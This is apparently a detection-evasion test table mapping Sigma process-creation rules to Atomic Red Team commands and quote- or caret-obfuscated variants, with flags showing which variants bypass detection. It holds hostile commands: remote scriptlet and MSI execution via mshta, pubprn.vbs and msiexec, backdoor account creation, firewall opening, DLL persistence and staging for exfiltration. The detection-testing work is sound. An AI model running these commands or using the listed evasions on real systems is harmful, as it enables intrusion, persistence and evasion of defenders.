Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1216.001	proc_creation_win_lolbin_pubprn	Pubprn.vbs Proxy Execution	1fb76ab8-fa60-4b01-bddd-71e89bf555da	"cmd.exe /c ""cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\..\en-US\pubprn.vbs localhost \""script:[https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct)\"""""	"cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\..\en-US\pubprn.vbs localhost ""script:[https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct)"""	TRUE	FALSE	FALSE	Pubprn.vbs Proxy Execution (1fb76ab8-fa60-4b01-bddd-71e89bf555da); Pubprn.vbs Proxy Execution (1fb76ab8-fa60-4b01-bddd-71e89bf555da)
t1021.003	proc_creation_win_mmc_mmc20_lateral_movement	MMC20 Lateral Movement	f1f3bf22-deb2-418d-8cce-e1a45e46a5bd		C:\WINDOWS\system32\mmc.exe /Embedding	TRUE	TRUE	TRUE	
t1021.003	proc_creation_win_mmc_mmc20_lateral_movement	MMC20 Lateral Movement	f1f3bf22-deb2-418d-8cce-e1a45e46a5bd		"C:\WINDOWS\system32\mmc.exe ""-Embedding"""	TRUE	TRUE	TRUE	
t1021.003	proc_creation_win_mmc_mmc20_lateral_movement	MMC20 Lateral Movement	f1f3bf22-deb2-418d-8cce-e1a45e46a5bd		"C:\WINDOWS\system32\mmc.exe -Embed""""ding"	TRUE	TRUE	TRUE	
t1218.005	proc_creation_win_mshta_http	Remotely Hosted HTA File Executed Via Mshta.EXE	b98d0db6-511d-45de-ad02-e82a98729620	"mshta.exe  javascript:a=GetObject('script:h\""\""ttps://[raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct)').Exec();close()"	"mshta.exe javascript:a=GetObject('script:h""""ttps://[raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct)').Exec();close()"	TRUE	FALSE	FALSE	Remotely Hosted HTA File Executed Via Mshta.EXE (b98d0db6-511d-45de-ad02-e82a98729620); Suspicious JavaScript Execution Via Mshta.EXE (67f113fa-e23d-4271-befa-30113b3e08b1)
t1218.005	proc_creation_win_mshta_http	Remotely Hosted HTA File Executed Via Mshta.EXE	b98d0db6-511d-45de-ad02-e82a98729620		"cmd.exe /c ""mshta.exe javascript:a=GetObject('script:htt^ps://[raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct)').Exec();close()"""	FALSE	FALSE	FALSE	
t1218.005	proc_creation_win_mshta_http	Remotely Hosted HTA File Executed Via Mshta.EXE	b98d0db6-511d-45de-ad02-e82a98729620	mshta.exe  javascript:a=GetObject('script://[raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct)').Exec();close()	mshta.exe javascript:a=GetObject('script://[raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct)').Exec();close()	TRUE	FALSE	FALSE	Remotely Hosted HTA File Executed Via Mshta.EXE (b98d0db6-511d-45de-ad02-e82a98729620); Suspicious JavaScript Execution Via Mshta.EXE (67f113fa-e23d-4271-befa-30113b3e08b1)
t1218.005	proc_creation_win_mshta_javascript	Suspicious JavaScript Execution Via Mshta.EXE	67f113fa-e23d-4271-befa-30113b3e08b1		"mshta.exe ""java""""script:a=GetObject('script:[https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct)').Exec();close()"""	TRUE	TRUE	FALSE	Remotely Hosted HTA File Executed Via Mshta.EXE (b98d0db6-511d-45de-ad02-e82a98729620)
t1218.005	proc_creation_win_mshta_javascript	Suspicious JavaScript Execution Via Mshta.EXE	67f113fa-e23d-4271-befa-30113b3e08b1		"cmd.exe /c ""mshta.exe java^script:a=GetObject('script:[https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct)').Exec();close()"""	FALSE	FALSE	FALSE	
t1218.005	proc_creation_win_mshta_javascript	Suspicious JavaScript Execution Via Mshta.EXE	67f113fa-e23d-4271-befa-30113b3e08b1		mshta.exe jscript:a=GetObject('script:[https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct)').Exec();close()	TRUE	TRUE	FALSE	Remotely Hosted HTA File Executed Via Mshta.EXE (b98d0db6-511d-45de-ad02-e82a98729620)
t1218.007	proc_creation_win_msiexec_dll	DllUnregisterServer Function Call Via Msiexec.EXE	84f52741-8834-4a8c-a413-2eb2269aa6c8		"c:\windows\system32\msiexec.exe  /z ""C:\AtomicRedTeam\atomics\T1218.007in\MSIRunner.dll"""	TRUE	TRUE	TRUE	
t1218.007	proc_creation_win_msiexec_dll	DllUnregisterServer Function Call Via Msiexec.EXE	84f52741-8834-4a8c-a413-2eb2269aa6c8		"c:\windows\system32\msiexec.exe ""/z"" ""C:\AtomicRedTeam\atomics\T1218.007in\MSIRunner.dll"""	TRUE	TRUE	TRUE	
t1218.007	proc_creation_win_msiexec_dll	DllUnregisterServer Function Call Via Msiexec.EXE	84f52741-8834-4a8c-a413-2eb2269aa6c8		"c:\windows\system32\msiexec.exe /z ""C:\AtomicRedTeam\atomics\T1218.007in\MSIRunner.dl""""l"""	TRUE	TRUE	TRUE	
t1218.007	proc_creation_win_msiexec_execute_dll	Suspicious Msiexec Execute Arbitrary DLL	6f4191bb-912b-48a8-9ce7-682769541e6d		"c:\windows\system32\msiexec.exe  /y ""C:\AtomicRedTeam\atomics\T1218.007in\MSIRunner.dll"""	TRUE	TRUE	TRUE	
t1218.007	proc_creation_win_msiexec_execute_dll	Suspicious Msiexec Execute Arbitrary DLL	6f4191bb-912b-48a8-9ce7-682769541e6d		"c:\windows\system32\msiexec.exe ""/y"" ""C:\AtomicRedTeam\atomics\T1218.007in\MSIRunner.dll"""	TRUE	TRUE	TRUE	
t1218.007	proc_creation_win_msiexec_execute_dll	Suspicious Msiexec Execute Arbitrary DLL	6f4191bb-912b-48a8-9ce7-682769541e6d		"c:\windows\system32\msiexec.exe -y ""C:\Windows\CCM\..\..\AtomicRedTeam\atomics\T1218.007in\MSIRunner.dll"""	TRUE	TRUE	TRUE	
t1218.007	proc_creation_win_msiexec_install_quiet	Msiexec Quiet Installation	79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5		"c:\windows\system32\msiexec.exe /i ""C:\AtomicRedTeam\atomics\T1218.007in\T1218.007_DLL.msi"" /quietn"	TRUE	TRUE	TRUE	
t1218.007	proc_creation_win_msiexec_install_quiet	Msiexec Quiet Installation	79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5		"c:\windows\system32\msiexec.exe ""/q"" ""/i"" ""C:\AtomicRedTeam\atomics\T1218.007in\T1218.007_DLL.msi"""	TRUE	TRUE	TRUE	
t1218.007	proc_creation_win_msiexec_install_quiet	Msiexec Quiet Installation	79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5		"c:\windows\system32\msiexec.exe /i ""C:\AtomicRedTeam\atomics\T1218.007in\T1218.007_DLL.msi"" /q""""n"	TRUE	TRUE	TRUE	
t1218.007	proc_creation_win_msiexec_install_remote	Suspicious Msiexec Quiet Install From Remote Location	8150732a-0c9d-4a99-82b9-9efb9b90c40c	"c:\windows\system32\msiexec.exe  /i \""[https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi](https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi)\"" /quietn"	"c:\windows\system32\msiexec.exe /i ""[https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi](https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi)"" /quietn"	TRUE	FALSE	FALSE	Msiexec Quiet Installation (79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5); Suspicious Msiexec Quiet Install From Remote Location (8150732a-0c9d-4a99-82b9-9efb9b90c40c)
t1218.007	proc_creation_win_msiexec_install_remote	Suspicious Msiexec Quiet Install From Remote Location	8150732a-0c9d-4a99-82b9-9efb9b90c40c	"c:\windows\system32\msiexec.exe  \""/q\"" \""/i\"" \""[https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi](https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi)\"""	"c:\windows\system32\msiexec.exe ""/q"" ""/i"" ""[https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi](https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi)"""	TRUE	FALSE	FALSE	Msiexec Quiet Installation (79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5); Suspicious Msiexec Quiet Install From Remote Location (8150732a-0c9d-4a99-82b9-9efb9b90c40c)
t1218.007	proc_creation_win_msiexec_install_remote	Suspicious Msiexec Quiet Install From Remote Location	8150732a-0c9d-4a99-82b9-9efb9b90c40c	"c:\windows\system32\msiexec.exe  /q /i \""h\""\""ttps://[github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi](https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi)\"""	"c:\windows\system32\msiexec.exe /q /i ""h""""ttps://[github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi](https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi)"""	TRUE	FALSE	FALSE	Msiexec Quiet Installation (79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5); Suspicious Msiexec Quiet Install From Remote Location (8150732a-0c9d-4a99-82b9-9efb9b90c40c)
t1070.005	proc_creation_win_net_share_unmount	Unmount Share Via Net.EXE	cb7c4a03-2871-43c0-9bbb-18bbdb079896		net share ADMIN$ -delete	TRUE	TRUE	TRUE	
t1070.005	proc_creation_win_net_share_unmount	Unmount Share Via Net.EXE	cb7c4a03-2871-43c0-9bbb-18bbdb079896		net share ADMIN$ /del	TRUE	TRUE	TRUE	
t1070.005	proc_creation_win_net_share_unmount	Unmount Share Via Net.EXE	cb7c4a03-2871-43c0-9bbb-18bbdb079896	"net  \""share\"" ADMIN$ \""/delete\"""	"net ""share"" ADMIN$ ""/delete"""	TRUE	FALSE	FALSE	Unmount Share Via Net.EXE (cb7c4a03-2871-43c0-9bbb-18bbdb079896); Unmount Share Via Net.EXE (cb7c4a03-2871-43c0-9bbb-18bbdb079896)
t1569.002	proc_creation_win_net_start_service	Start Windows Service Via Net.EXE	2a072a96-a086-49fa-bcb5-15cc5a619093	net   start  sesshijack	net  start  sesshijack	TRUE	FALSE	FALSE	Start Windows Service Via Net.EXE (2a072a96-a086-49fa-bcb5-15cc5a619093); Start Windows Service Via Net.EXE (2a072a96-a086-49fa-bcb5-15cc5a619093)
t1569.002	proc_creation_win_net_start_service	Start Windows Service Via Net.EXE	2a072a96-a086-49fa-bcb5-15cc5a619093		"net ""start"" sesshijack"	TRUE	TRUE	TRUE	
t1569.002	proc_creation_win_net_start_service	Start Windows Service Via Net.EXE	2a072a96-a086-49fa-bcb5-15cc5a619093	"net  start \""sesshijack\"""	"net start ""sesshijack"""	TRUE	FALSE	FALSE	Start Windows Service Via Net.EXE (2a072a96-a086-49fa-bcb5-15cc5a619093); Start Windows Service Via Net.EXE (2a072a96-a086-49fa-bcb5-15cc5a619093)
t1569.002	proc_creation_win_pua_nircmd	PUA - NirCmd Execution	4e2ed651-1906-4a59-a78a-18220fca1b22		nircmd.exe execmd calc.exe	FALSE	FALSE	FALSE	
t1569.002	proc_creation_win_pua_nircmd	PUA - NirCmd Execution	4e2ed651-1906-4a59-a78a-18220fca1b22		"nircmd.exe ""execmd"" calc.exe"	FALSE	FALSE	FALSE	
t1569.002	proc_creation_win_pua_nircmd	PUA - NirCmd Execution	4e2ed651-1906-4a59-a78a-18220fca1b22		nircmd.exe exec show calc.exe	FALSE	FALSE	FALSE	
t1136.001	proc_creation_win_net_user_add	New User Created Via Net.EXE	cd219ff3-fa99-45d4-8380-a7d15116c6dc	"net  user /add:yes \""T1136.001_Admin\"" \""T1136_pass\"""	"net user /add:yes ""T1136.001_Admin"" ""T1136_pass"""	TRUE	FALSE	FALSE	New User Created Via Net.EXE (cd219ff3-fa99-45d4-8380-a7d15116c6dc); New User Created Via Net.EXE (cd219ff3-fa99-45d4-8380-a7d15116c6dc)
t1136.001	proc_creation_win_net_user_add	New User Created Via Net.EXE	cd219ff3-fa99-45d4-8380-a7d15116c6dc	"net  \""user\"" /add \""T1136.001_Admin\"" \""T1136_pass\"""	"net ""user"" /add ""T1136.001_Admin"" ""T1136_pass"""	TRUE	FALSE	FALSE	New User Created Via Net.EXE (cd219ff3-fa99-45d4-8380-a7d15116c6dc); New User Created Via Net.EXE (cd219ff3-fa99-45d4-8380-a7d15116c6dc)
t1136.001	proc_creation_win_net_user_add	New User Created Via Net.EXE	cd219ff3-fa99-45d4-8380-a7d15116c6dc		"net user ""/ad""""d"" ""T1136.001_Admin"" ""T1136_pass"""	TRUE	TRUE	FALSE	Local Accounts Discovery (502b42de-4306-40b4-9596-6f590c81f073); Local Accounts Discovery (502b42de-4306-40b4-9596-6f590c81f073)
t1136.001	proc_creation_win_net_user_add_never_expire	New User Created Via Net.EXE With Never Expire Option	b9f0e6f5-09b4-4358-bae4-08408705bd5c	net  user /add:yes AtomicOperator$ At0micRedTeam! /expires:never	net user /add:yes AtomicOperator$ At0micRedTeam! /expires:never	TRUE	FALSE	FALSE	New User Created Via Net.EXE With Never Expire Option (b9f0e6f5-09b4-4358-bae4-08408705bd5c); New User Created Via Net.EXE With Never Expire Option (b9f0e6f5-09b4-4358-bae4-08408705bd5c); New User Created Via Net.EXE (cd219ff3-fa99-45d4-8380-a7d15116c6dc); New User Created Via Net.EXE (cd219ff3-fa99-45d4-8380-a7d15116c6dc)
t1136.001	proc_creation_win_net_user_add_never_expire	New User Created Via Net.EXE With Never Expire Option	b9f0e6f5-09b4-4358-bae4-08408705bd5c	"net  \""user\"" /add AtomicOperator$ At0micRedTeam! /expires:never"	"net ""user"" /add AtomicOperator$ At0micRedTeam! /expires:never"	TRUE	FALSE	FALSE	New User Created Via Net.EXE With Never Expire Option (b9f0e6f5-09b4-4358-bae4-08408705bd5c); New User Created Via Net.EXE With Never Expire Option (b9f0e6f5-09b4-4358-bae4-08408705bd5c); New User Created Via Net.EXE (cd219ff3-fa99-45d4-8380-a7d15116c6dc); New User Created Via Net.EXE (cd219ff3-fa99-45d4-8380-a7d15116c6dc)
t1136.001	proc_creation_win_net_user_add_never_expire	New User Created Via Net.EXE With Never Expire Option	b9f0e6f5-09b4-4358-bae4-08408705bd5c		"net user /add AtomicOperator$ At0micRedTeam! /expires:""never"""	TRUE	TRUE	FALSE	New User Created Via Net.EXE (cd219ff3-fa99-45d4-8380-a7d15116c6dc); New User Created Via Net.EXE (cd219ff3-fa99-45d4-8380-a7d15116c6dc)
t1560.001	proc_creation_win_net_user_default_accounts_manipulation	Suspicious Manipulation Of Default Accounts Via Net.EXE	5b768e71-86f2-4879-b448-81061cbae951	net   user  administrator /domain	net  user  administrator /domain	TRUE	FALSE	FALSE	Suspicious Manipulation Of Default Accounts Via Net.EXE (5b768e71-86f2-4879-b448-81061cbae951); Suspicious Manipulation Of Default Accounts Via Net.EXE (5b768e71-86f2-4879-b448-81061cbae951)
t1560.001	proc_creation_win_net_user_default_accounts_manipulation	Suspicious Manipulation Of Default Accounts Via Net.EXE	5b768e71-86f2-4879-b448-81061cbae951		"net ""user"" administrator /domain"	TRUE	TRUE	TRUE	
t1560.001	proc_creation_win_net_user_default_accounts_manipulation	Suspicious Manipulation Of Default Accounts Via Net.EXE	5b768e71-86f2-4879-b448-81061cbae951		"net user ""administrator"""""" /domain"	TRUE	TRUE	TRUE	
t1560.001	proc_creation_win_winzip_password_compression	Compress Data and Lock With Password for Exfiltration With WINZIP	e2e80da2-8c66-4e00-ae3c-2eebd29f6b6d		"""cmd.exe"" /c path=%path%;""C:\Program Files (x86)\winzip"" & mkdir .	mp\victim-files & cd .	mp\victim-files & echo ""This file will be encrypted"" > .\encrypted_file.txt & ""%ProgramFiles%\WinZip\winzip64.exe"" -a -min -s""hello"" archive.zip * & dir"	TRUE	TRUE	FALSE	File And SubFolder Enumeration Via Dir Command (7c9340a9-e2ee-4e43-94c5-c54ebbea1006)
t1560.001	proc_creation_win_winzip_password_compression	Compress Data and Lock With Password for Exfiltration With WINZIP	e2e80da2-8c66-4e00-ae3c-2eebd29f6b6d		"""cmd.exe"" /c path=%path%;""C:\Program Files (x86)\winzip"" & mkdir .	mp\victim-files & cd .	mp\victim-files & echo ""This file will be encrypted"" > .\encrypted_file.txt & ""%ProgramFiles%\WinZip\winzip64.exe""  -min  -a  -s""hello"" archive.zip * & dir"	TRUE	TRUE	FALSE	File And SubFolder Enumeration Via Dir Command (7c9340a9-e2ee-4e43-94c5-c54ebbea1006)
t1560.001	proc_creation_win_winzip_password_compression	Compress Data and Lock With Password for Exfiltration With WINZIP	e2e80da2-8c66-4e00-ae3c-2eebd29f6b6d		"""cmd.exe"" /c path=%path%;""C:\Program Files (x86)\winzip"" & mkdir .	mp\victim-files & cd .	mp\victim-files & echo ""This file will be encrypted"" > .\encrypted_file.txt & ""%ProgramFiles%\WinZip\winzip64.exe"" -min -a ""-s""hello"""" archive.zip * & dir"	TRUE	TRUE	FALSE	File And SubFolder Enumeration Via Dir Command (7c9340a9-e2ee-4e43-94c5-c54ebbea1006)
t1018	proc_creation_win_net_view_share_and_sessions_enum	Share And Session Enumeration Using Net.EXE	62510e69-616b-4078-b371-847da438cc03	net   view  /all	net  view  /all	TRUE	FALSE	FALSE	Share And Session Enumeration Using Net.EXE (62510e69-616b-4078-b371-847da438cc03)
t1018	proc_creation_win_net_view_share_and_sessions_enum	Share And Session Enumeration Using Net.EXE	62510e69-616b-4078-b371-847da438cc03	"net  \""view\"" /all"	"net ""view"" /all"	TRUE	FALSE	FALSE	Share And Session Enumeration Using Net.EXE (62510e69-616b-4078-b371-847da438cc03); Share And Session Enumeration Using Net.EXE (62510e69-616b-4078-b371-847da438cc03)
t1018	proc_creation_win_net_view_share_and_sessions_enum	Share And Session Enumeration Using Net.EXE	62510e69-616b-4078-b371-847da438cc03	net  view /all \127.0.0.1\..\..	net view /all \127.0.0.1\..\..	TRUE	FALSE	FALSE	Share And Session Enumeration Using Net.EXE (62510e69-616b-4078-b371-847da438cc03)
t1018	proc_creation_win_renamed_adfind	Renamed AdFind Execution	df55196f-f105-44d3-a675-e9dfb6cc2f2b		"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe"" -f ""objectcategory""=subnet"	FALSE	FALSE	FALSE	
t1018	proc_creation_win_renamed_adfind	Renamed AdFind Execution	df55196f-f105-44d3-a675-e9dfb6cc2f2b		"cmd.exe /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe"" -f object^category=subnet"	FALSE	FALSE	FALSE	
t1018	proc_creation_win_renamed_adfind	Renamed AdFind Execution	df55196f-f105-44d3-a675-e9dfb6cc2f2b		"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe"" -sc trust""""dmp"	FALSE	FALSE	FALSE	
t1018	proc_creation_win_renamed_adfind	Renamed AdFind Execution	df55196f-f105-44d3-a675-e9dfb6cc2f2b		"powershell.exe -Command ""[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().GetTrustRelationships()"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1562.004	proc_creation_win_netsh_fw_add_rule	New Firewall Rule Added Via Netsh.EXE	cd5cfd80-aa5f-44c0-9c20-108c4ae12e3c	"netsh  advfirewall firewall  add  rule name=\""RDPPORTLatest-TCP-In\"" dir=in action=allow protocol=TCP localport=4489"	"netsh advfirewall firewall  add  rule name=""RDPPORTLatest-TCP-In"" dir=in action=allow protocol=TCP localport=4489"	TRUE	FALSE	FALSE	New Firewall Rule Added Via Netsh.EXE (cd5cfd80-aa5f-44c0-9c20-108c4ae12e3c)
t1562.004	proc_creation_win_netsh_fw_add_rule	New Firewall Rule Added Via Netsh.EXE	cd5cfd80-aa5f-44c0-9c20-108c4ae12e3c		"netsh advfirewall ""firewall"" add rule name=""RDPPORTLatest-TCP-In"" dir=in action=allow protocol=TCP localport=4489"	TRUE	TRUE	TRUE	
t1562.004	proc_creation_win_netsh_fw_add_rule	New Firewall Rule Added Via Netsh.EXE	cd5cfd80-aa5f-44c0-9c20-108c4ae12e3c	"netsh  advfirewall firewall add rule name=Dropbox dir=in action=allow \""program=C:\Program Files\Dropbox\Client\Dropbox.exe\"" enable=yes profile=Any protocol=TCP localport=4489"	"netsh advfirewall firewall add rule name=Dropbox dir=in action=allow ""program=C:\Program Files\Dropbox\Client\Dropbox.exe"" enable=yes profile=Any protocol=TCP localport=4489"	TRUE	FALSE	FALSE	New Firewall Rule Added Via Netsh.EXE (cd5cfd80-aa5f-44c0-9c20-108c4ae12e3c)
t1016	proc_creation_win_netsh_fw_rules_discovery	Firewall Configuration Discovery Via Netsh.EXE	0e4164da-94bc-450d-a7be-a4b176179f1f	netsh   advfirewall firewall show rule name=all	netsh  advfirewall firewall show rule name=all	TRUE	FALSE	FALSE	Firewall Configuration Discovery Via Netsh.EXE (0e4164da-94bc-450d-a7be-a4b176179f1f)
t1016	proc_creation_win_netsh_fw_rules_discovery	Firewall Configuration Discovery Via Netsh.EXE	0e4164da-94bc-450d-a7be-a4b176179f1f	"netsh  advfirewall \""firewall\"" show rule name=all"	"netsh advfirewall ""firewall"" show rule name=all"	TRUE	FALSE	FALSE	Firewall Configuration Discovery Via Netsh.EXE (0e4164da-94bc-450d-a7be-a4b176179f1f)
t1016	proc_creation_win_netsh_fw_rules_discovery	Firewall Configuration Discovery Via Netsh.EXE	0e4164da-94bc-450d-a7be-a4b176179f1f	"netsh  advfirewall firewall show rule name=\""all\"""	"netsh advfirewall firewall show rule name=""all"""	TRUE	FALSE	FALSE	Firewall Configuration Discovery Via Netsh.EXE (0e4164da-94bc-450d-a7be-a4b176179f1f)
t1016	proc_creation_win_susp_network_command	Suspicious Network Command	a29c1813-ab1f-4dde-b489-330b952e91ae		"""cmd.exe"" /c ipconfig /a^ll"	FALSE	FALSE	FALSE	
t1016	proc_creation_win_susp_network_command	Suspicious Network Command	a29c1813-ab1f-4dde-b489-330b952e91ae		"""cmd.exe"" /c ""netsh"" ""interface"" ""show"" ""interface"""	FALSE	FALSE	FALSE	
t1016	proc_creation_win_susp_network_command	Suspicious Network Command	a29c1813-ab1f-4dde-b489-330b952e91ae		"""cmd.exe"" /c set C=config && net %C% workstation"	FALSE	FALSE	FALSE	
t1016	proc_creation_win_susp_network_command	Suspicious Network Command	a29c1813-ab1f-4dde-b489-330b952e91ae		"""cmd.exe"" /c arp -""a"""	FALSE	FALSE	FALSE	
t1016	proc_creation_win_susp_network_command	Suspicious Network Command	a29c1813-ab1f-4dde-b489-330b952e91ae		"""cmd.exe"" /c route pr^int"	FALSE	FALSE	FALSE	
t1546.007	proc_creation_win_netsh_helper_dll_persistence	Potential Persistence Via Netsh Helper DLL	56321594-9087-49d9-bf10-524fe8479452		"netsh.exe ""add"" helper ""C:\AtomicRedTeam\atomics\T1546.007in\NetshHelper.dll"""	TRUE	TRUE	TRUE	
t1546.007	proc_creation_win_netsh_helper_dll_persistence	Potential Persistence Via Netsh Helper DLL	56321594-9087-49d9-bf10-524fe8479452		"netsh.exe add ""hel""""per"" ""C:\AtomicRedTeam\atomics\T1546.007in\NetshHelper.dll"""	TRUE	TRUE	TRUE	
t1546.007	proc_creation_win_netsh_helper_dll_persistence	Potential Persistence Via Netsh Helper DLL	56321594-9087-49d9-bf10-524fe8479452		"cmd.exe /c ""netsh.exe ad^d helper ""C:\AtomicRedTeam\atomics\T1546.007in\NetshHelper.dll"""""	FALSE	FALSE	FALSE	
t1090	proc_creation_win_netsh_port_forwarding	New Port Forwarding Rule Added Via Netsh.EXE	322ed9ec-fcab-4f67-9a34-e7c6aef43614	"netsh.exe  interface portproxy add v4tov4 listenport=1337 connect\""\""port=1337 connectaddress=127.0.0.1"	"netsh.exe interface portproxy add v4tov4 listenport=1337 connect""""port=1337 connectaddress=127.0.0.1"	TRUE	FALSE	FALSE	New Port Forwarding Rule Added Via Netsh.EXE (322ed9ec-fcab-4f67-9a34-e7c6aef43614)
t1090	proc_creation_win_netsh_port_forwarding	New Port Forwarding Rule Added Via Netsh.EXE	322ed9ec-fcab-4f67-9a34-e7c6aef43614		"netsh.exe i""""nt portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1"	FALSE	FALSE	FALSE	
t1090	proc_creation_win_netsh_port_forwarding	New Port Forwarding Rule Added Via Netsh.EXE	322ed9ec-fcab-4f67-9a34-e7c6aef43614	netsh.exe  interface portproxy add v4tov4 listenport=1337 connectport=1337  connectaddress=127.0.0.1	netsh.exe interface portproxy add v4tov4 listenport=1337 connectport=1337  connectaddress=127.0.0.1	TRUE	FALSE	FALSE	New Port Forwarding Rule Added Via Netsh.EXE (322ed9ec-fcab-4f67-9a34-e7c6aef43614)
t1218.008	proc_creation_win_odbcconf_register_dll_regsvr	New DLL Registered Via Odbcconf.EXE	9f0a8bf3-a65b-440a-8c1e-5cb1547c8e70	"odbcconf.exe  /S /A {REGSVR  \""C:\AtomicRedTeam\atomics\T1218.008\src\Win32\T1218-2.dll\""}"	"odbcconf.exe /S /A {REGSVR  ""C:\AtomicRedTeam\atomics\T1218.008\src\Win32\T1218-2.dll""}"	TRUE	FALSE	FALSE	New DLL Registered Via Odbcconf.EXE (9f0a8bf3-a65b-440a-8c1e-5cb1547c8e70)
t1218.008	proc_creation_win_odbcconf_register_dll_regsvr	New DLL Registered Via Odbcconf.EXE	9f0a8bf3-a65b-440a-8c1e-5cb1547c8e70		"odbcconf.exe /S /A {REGSVR ""C:\AtomicRedTeam\atomics\T1218.008\src\Win32\T1218-2.dl""""l""}"	TRUE	TRUE	FALSE	Potentially Suspicious DLL Registered Via Odbcconf.EXE (ba4cfc11-d0fa-4d94-bf20-7c332c412e76)
